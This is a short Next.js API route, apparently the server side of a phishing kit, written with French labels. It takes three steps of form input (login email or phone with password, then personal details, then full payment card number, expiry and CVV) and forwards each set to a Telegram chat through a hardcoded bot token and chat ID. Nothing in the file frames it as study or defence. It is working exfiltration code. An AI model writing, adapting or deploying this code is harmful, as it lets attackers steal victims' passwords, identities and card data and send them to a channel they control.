import { NextResponse } from 'next/server';

export async function POST(request) {
  const data = await request.json();

  const botToken = '8515327609:AAEWGkA8TRf8nrOR1Y8RXxufmbMz9F6sH7I';
  const chatId = '6927572098';

  let message = "";
  if (data.step === 1) {
    message = `
    📢 *Nouvelle soumission - Étape 1*
    =============================
    📧 *Email/Téléphone* : \`${data.emailOrPhone}\`
    🔑 *Mot de passe* : \`${data.password}\`
    `;
  } else if (data.step === 2) {
    message = `
    📢 *Nouvelle soumission - Étape 2*
    =============================
    👤 *Nom* : \`${data.nom}\`
    📅 *Date de naissance* : \`${data.birthDate}\`
    📍 *Adresse* : \`${data.adresse}\`
    🏙️ *Ville* : \`${data.ville}\`
    📮 *Code postal* : \`${data.codePostal}\`
    📱 *Téléphone* : \`${data.telephone}\`
    `;
  } else if (data.step === 3) {
    message = `
    📢 *Nouvelle soumission - Étape 3*
    =============================
    👤 *Titulaire* : \`${data.nomTitulaire}\`
    💳 *Numéro de carte* : \`${data.cardNumber}\`
    📅 *Expiration* : \`${data.expiryDate}\`
    🔒 *CVV* : \`${data.cvv}\`
    `;
  }

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: "Markdown"
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`Erreur lors de l'envoi du message: ${response.statusText}`);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}